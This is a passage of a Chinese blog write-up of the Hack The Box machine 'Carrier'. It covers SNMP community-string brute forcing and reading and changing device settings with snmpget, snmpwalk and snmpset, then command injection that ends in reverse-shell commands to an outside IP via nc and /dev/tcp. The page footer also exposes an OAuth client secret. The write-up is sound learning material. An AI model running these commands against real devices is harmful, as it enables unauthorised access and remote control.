+<h4 id="Community-String"><a href="#Community-String" class="headerlink" title="Community String"></a>Community String</h4><p><code>Community String</code>在交换机与路由器配置里意为”社区字符串”也有人叫”团体名”，其实说的都是一个东西。Community其实就是充当<strong>密码</strong>作用的一串字符串而已。大多数的设备供应商，默认都有两个Community String：</p>
+<ul>
+<li><strong>public 通常用来查询(只读)</strong></li>
+<li><strong>private 通常用来查询和配置(读写)</strong></li>
+</ul>
+<p>P.S：很多安全问题就是由这两个”默认密码”而引发的。</p>
+<h4 id="MIB和OID"><a href="#MIB和OID" class="headerlink" title="MIB和OID"></a>MIB和OID</h4><p>MIB全称管理信息库，是一种<strong>树状数据库；</strong>MIB管理的对象，就是树的节点。每个节点都有唯一名字和唯一OID(Object Identifier)，OID由树上的一系列整数组成，整数之间用点( . )分隔开，树的叶子节点才是真正能够被管理的对象。</p>
+<p>我们通过SNMP获取信息就会用到OID，比如网络设备名的OID 是.1.3.6.1.2.1.1.5.0，其值为设备名称的字符串。简单点来理解就是：<strong>把MIB当成一个k.v数据库，我们输入key(OID)就能获取到对应的value</strong>。</p>
+<p>为了方便查阅，我们收集了一些OID列表和MIB库。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.10-strike.com/network-monitor/pro/useful-snmp-oids.shtml">https://www.10-strike.com/network-monitor/pro/useful-snmp-oids.shtml</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/JosefJezek/6824959">https://gist.github.com/JosefJezek/6824959</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.ttlsa.com/monitor/snmp-oid/">http://www.ttlsa.com/monitor/snmp-oid/</a></li>
+</ul>
+<p><strong>OID查询</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.oid-info.com/cgi-bin/display?tree=#focus">http://www.oid-info.com/cgi-bin/display?tree=#focus</a></li>
+<li><a target="_blank" rel="noopener" href="https://bestmonitoringtools.com/mibdb/mibdb_search.php">https://bestmonitoringtools.com/mibdb/mibdb_search.php</a></li>
+</ul>
+<p>除了上面提到的，其实还有一种方法可以获取MIB库。那就是直接从设备供应商的官网进行下载，如下是我在<a target="_blank" rel="noopener" href="http://www.h3c.com/cn/d_200906/636062_30003_0.htm#_Toc231200798">h3c文档</a>上看到的。<img src="/2022/07/30/HTB-Carrier/1641805247_61dbf5bf35eaff7c66e33.jpeg" alt="img"></p>
+<h3 id="UDP-和-TCP-啥区别？"><a href="#UDP-和-TCP-啥区别？" class="headerlink" title="UDP 和 TCP 啥区别？"></a>UDP 和 TCP 啥区别？</h3><blockquote>
+<p>UDP简介： UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的 上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报 文发送之后，是无法得知其是否安全完整到达的。</p>
+<p>UDP显著特性： </p>
+<p>1.UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被 复制，被重新排序，也不保证每个数据报只到达一次</p>
+<p>2.UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的 地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任 何（协议上的）记录边界。 </p>
+<p>3.UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都 选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报 4.UDP 支持多播和广播</p>
+</blockquote>
+<p><img src="/2022/07/30/HTB-Carrier/v2-315b593f06c45856ce70de5e2d8d8ec2_1440w.jpg" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Li_Ning_/article/details/52117463">https://blog.csdn.net/Li_Ning_/article/details/52117463</a></p>
+<h3 id="基于UDP的扫描"><a href="#基于UDP的扫描" class="headerlink" title="基于UDP的扫描"></a>基于UDP的扫描</h3><h4 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmao</span> -sU -T5 -sV --max-retries <span class="number">1</span> <span class="number">192.168.1.100</span> -p <span class="number">500</span> （不推荐，理由慢）</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-sU 基于UDP的扫描</p>
+<p>-T5 nmap的扫描速度 -T（0-5）越大越快</p>
+<p>-sV  探测开启的端口来获取服务、版本信息</p>
+<p>–max-retries <tries>  扫描探测的上限次数设定</tries></p>
+<p>-p 只扫描指定端口</p>
+</blockquote>
+<h4 id="msf扫描"><a href="#msf扫描" class="headerlink" title="msf扫描"></a>msf扫描</h4><p>两个模块</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary<span class="regexp">/scanner/</span>discovery/udp_prob</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary<span class="regexp">/scanner/</span>discovery/udp_sweep</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>use 引用</p>
+<p>show options 显示可设置的参数</p>
+<p>auxiliary （辅助）/ scanner（扫描）/discovery（发现）/udp_probe（探测）/udp_sweep(彻底搜索)</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> auxiliary(scanner/discovery/udp_sweep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Sending <span class="number">13</span> probes to <span class="number">10.10.10.105</span>-&gt;<span class="number">10.10.10.105</span> (<span class="number">1</span> hosts)</span><br><span class="line">[*] Discovered SNMP <span class="literal">on</span> <span class="number">10.10.10.105:161</span> ()</span><br><span class="line">[*] Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>下次再也不用nmap了 太慢了 艹</p>
+<h4 id="net-snmp"><a href="#net-snmp" class="headerlink" title="net-snmp"></a>net-snmp</h4><p>kali系统里面已经内置net-snmp工具包，我们直接终端输入命令即可使用；net-snmp是我们本次测试SNMP主要工具，后续的操作都采用这款工具进行演示和操作。</p>
+<p>Net-snmp工具包提供如下工具，支持对交换机进行各种操作。</p>
+<p><img src="/2022/07/30/HTB-Carrier/1641805341_61dbf61d0762d2e683677.jpeg" alt="img"></p>
+<p>而我们平常主要使用snmpwalk、snmpget、snmpset这三款工具进行测试。snmpwalk和snmpget都可以用来获取值，其主要区别是snmpwalk是对OID值的遍历，而snmpget是取具体的OID的值。</p>
+<h2 id="4-打snmp"><a href="#4-打snmp" class="headerlink" title="4.打snmp"></a>4.打snmp</h2><p><strong>首先要去获取一个叫 Community String 的东西</strong>，前面的基础知识已经介绍了Community String就是密码，所以我们要想使用SNMP肯定需要先知道它对应的”密码”。</p>
+<p>然后分为两个步骤</p>
+<h3 id="默认密码尝试-amp-爆破"><a href="#默认密码尝试-amp-爆破" class="headerlink" title="默认密码尝试&amp;爆破"></a>默认密码尝试&amp;爆破</h3><p>大多数的设备供应商和一些网管都喜欢用public和private。</p>
+<p><img src="/2022/07/30/HTB-Carrier/image-20220801233558415.png" alt="image-20220801233558415"></p>
+<p>还真给试出来了</p>
+<p>如果通过手动尝试默认密码失败之后，我们还可以进行爆破。一般SNMP密码都不会太复杂，很容易就跑出来了。</p>
+<p>进行SNMP密码爆破，我们需要用到一款新的工具onesixtyone</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp/sql]</span><br><span class="line">└─<span class="comment"># onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.105  -w 64 </span></span><br><span class="line">Scanning 1 hosts, 51 communities</span><br><span class="line">10.10.10.105 [public] Host responded with error NO SUCH NAME</span><br></pre></td></tr></table></figure>
+
+<p>也不知道这算不算扫出来了(应该算吧</p>
+<p>这里有个string <code>STRING: &quot;SN#NET_45JDX23&quot;</code></p>
+<p>看了眼wp 说这是登录密码 （捂脸） 我经验太少啦</p>
+<h3 id="snmp攻击学习"><a href="#snmp攻击学习" class="headerlink" title="snmp攻击学习"></a>snmp攻击学习</h3><h4 id="敏感信息获取"><a href="#敏感信息获取" class="headerlink" title="敏感信息获取"></a>敏感信息获取</h4><p>敏感信息获取。在拿到”密码”之后我们就可以开始下一步利用了，我们需要收集什么信息可以通过之前提供的OID表进行查询，需要注意的是不同设备OID是不同的。</p>
+<ul>
+<li>获取设备名</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpget</span> -c private -v2c <span class="number">192.168.6.1</span> .<span class="number">1.3.6.1</span>.<span class="number">2.1.1.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641805894_61dbf846f127775bd0cf4.jpeg" alt="img"></p>
+<ul>
+<li>获取设备运行了多久</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpget</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">2.1.1.3</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641805938_61dbf872e61277d133d94.jpeg" alt="img"></p>
+<ul>
+<li>获取设备划分的vlan</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpwalk</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">4</span>.<span class="number">1</span>.<span class="number">25506</span>.<span class="number">8.35.2.1</span>.<span class="number">5</span>.<span class="number">1</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641805972_61dbf8945cb1e5a640a45.jpeg" alt="img"></p>
+<ul>
+<li>获取设备开放的端口</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpwalk</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">2.1.6.13</span>.<span class="number">1</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641805987_61dbf8a307d0fcec572cd.jpeg" alt="img"></p>
+<ul>
+<li>获取存活的内网ip</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpwalk</span> -c private -v2c <span class="number">192.168.6.1</span> <span class="number">1.3.6.1</span>.<span class="number">2.1.4.22</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">634</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641805999_61dbf8afd9ec1c48455c6.jpeg" alt="img"></p>
+<p>如果嫌找OID太麻烦，还可以直接用snmpwalk遍历整个MIB库。然后把数据保存下来慢慢翻，这也是种不错的选择。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -<span class="keyword">c</span> <span class="keyword">private</span> -v<span class="number">2</span><span class="keyword">c</span> <span class="number">192.168</span>.<span class="number">6.1</span> &gt;&gt;h<span class="number">3</span>c_oid.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641806378_61dbfa2a9d557d318c4ad.jpeg" alt="img"></p>
+<p>P.S：如果查询的内容返回值是单条信息，如”设备名称”可以用snmpget工具进行查询。如果是返回多条信息如”vlan信息”就需要用snmpwalk工具进行查询。snmpwalk单条信息和多条信息都使用，因为它是对OID进行遍历操作。</p>
+<h4 id="设备配置修改"><a href="#设备配置修改" class="headerlink" title="设备配置修改"></a>设备配置修改</h4><p>除了可以读取信息，我们还可以对设备的配置进行修改。但这样做侵入性非常高，不建议这样做，一旦操作失误，极有可能暴露自己，从而导致权限的丢失。下面简单的演示一下配置修改：</p>
+<p>我们先获取设备的名称。从返回值我们可以知道该设备名是”H3C”</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpget</span> -c private -v2c <span class="number">192.168.6.1</span> .<span class="number">1.3.6.1</span>.<span class="number">2.1.1.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641806281_61dbf9c9c97837ed6a1a8.jpeg" alt="img"></p>
+<p>我们尝试对其进行修改，把名称改为”hacker”。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snmpset</span> -c private -v2c <span class="number">192.168.6.1</span> .<span class="number">1.3.6.1</span>.<span class="number">2.1.1.5</span>.<span class="number">0</span> s <span class="string">&quot;hacker&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/30/HTB-Carrier/1641806255_61dbf9af395a3b33b012f.jpeg" alt="img"></p>
+<p>再次获取设备名，发现已经修改成功了。</p>
+<p><img src="/2022/07/30/HTB-Carrier/1641806225_61dbf9913416bd30af2d6.jpeg" alt="img"></p>
+<p>如果拿到的”社区字符串”是只读权限的，我们尝试修改会报如下错误：</p>
+<p><img src="/2022/07/30/HTB-Carrier/1641806105_61dbf919c59d8d8c30207.jpeg" alt="img"></p>
+<p>在实战中，我们可以根据目标具体的场景来做不同的修改：如改一下设备的<strong>ACL。</strong></p>
+<h4 id="SNMP-rce"><a href="#SNMP-rce" class="headerlink" title="SNMP rce"></a>SNMP rce</h4><p>最后再来谈谈rce。SNMP并不是所有设备都可以被rce，目前看来好几个可以rce的都已经加到msf模块里面了。除此之外，如果目标是linux系统还可以借助<strong>NET-SNMP-EXTEND-MIB</strong>来进行rce。由于篇幅原因这里不再深入研究，具体操作可见下面两篇文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/">https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/</a></li>
+<li><a target="_blank" rel="noopener" href="https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/">https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</a></li>
+</ul>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdp-gacl/p/3978825.html">https://www.cnblogs.com/xdp-gacl/p/3978825.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85976">https://www.anquanke.com/post/id/85976</a></li>
+<li><a target="_blank" rel="noopener" href="https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/">https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85976">https://www.anquanke.com/post/id/85976</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260832#h3-8">https://www.anquanke.com/post/id/260832#h3-8</a></li>
+</ul>
+<h2 id="5-登录后继续测试"><a href="#5-登录后继续测试" class="headerlink" title="5.登录后继续测试"></a>5.登录后继续测试</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户 <span class="literal">admin</span></span><br><span class="line">密码 NET_45JDX23</span><br></pre></td></tr></table></figure>
+
+<p>然后再去看看有没有什么可以打的地方</p>
+<p><img src="/2022/07/30/HTB-Carrier/image-20220802003007736.png" alt="image-20220802003007736"></p>
+<p>在这里找到了 像是可以进行命令执行的东西</p>
+<p>抓个包来看看</p>
+<p><img src="/2022/07/30/HTB-Carrier/image-20220802003346930.png" alt="image-20220802003346930"></p>
+<p>base64解一下码试一试</p>
+<img src="/2022/07/30/HTB-Carrier/image-20220802003328767.png" alt="image-20220802003328767" style="zoom:50%;">
+
+<p>ok 感觉命令执行有了</p>
+<p>试了几条命令好像没啥反应 试了下 id 结果有反应了</p>
+<p><img src="/2022/07/30/HTB-Carrier/image-20220802004055803.png" alt="image-20220802004055803"></p>
+<p>但我还是没搞明白 到低怎么直接执行命令 估计是要去拼接什么东西？</p>
+<p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/lsgxeva-p-14028910.html">Quagga的安装和使用 - 走看看 (zoukankan.com)</a></p>
+<p>我大意了  加个<code>;</code> 就可以直接命令执行  小技巧 果然需要积累啊啊啊</p>
+<p><img src="/2022/07/30/HTB-Carrier/image-20220802004942414.png" alt="image-20220802004942414"></p>
+<p>bp ctrl + B 即可base64 （每天一个小技巧</p>
+<p>可以命令执行后 我们想要反弹一个shell</p>
+<p>貌似curl跑不通 试试直接反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/sh <span class="number">10.10.14.7</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>;bash -i &gt;&amp; /dev/tcp/<span class="number">10.10.14.7</span>/<span class="number">5000</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>估计是环境 or 网有问题 反弹shell过不来 草</p>
+<h2 id="6-路由劫持部分"><a href="#6-路由劫持部分" class="headerlink" title="6.路由劫持部分"></a>6.路由劫持部分</h2><p>这块说实话我是小白一个 </p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/geek/293403.html">关于BGP那些事儿 - FreeBuf网络安全行业门户</a></p>
+<h1 id="升华部分"><a href="#升华部分" class="headerlink" title="升华部分"></a>升华部分</h1><p>现在我们通过这题来思考一个问题</p>
+<p>假如给你一个登录框</p>
+<p>你应该测试哪些东西？如何去测试</p>
+<p>正好这两天再先知社区上看到一个人写了类似的文章 这里 我也来总结一下</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11577">实战登录框漏洞测试 - 先知社区 (aliyun.com)</a></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h2 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h2><h3 id="验证码内容是否可控？"><a href="#验证码内容是否可控？" class="headerlink" title="验证码内容是否可控？"></a>验证码内容是否可控？</h3><h3 id="越权与逻辑漏洞"><a href="#越权与逻辑漏洞" class="headerlink" title="越权与逻辑漏洞"></a>越权与逻辑漏洞</h3>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/07/30/HTB-Carrier/" title="HTB Carrier">http://example.com/2022/07/30/HTB-Carrier/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/30/qwb2022/" rel="prev" title="qwb2022">
+                  <i class="fa fa-chevron-left"></i> qwb2022
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/07/30/sqlmap/" rel="next" title="sqlmap">
+                  sqlmap <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"c562d28775e213aa3d678297dca4b983"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
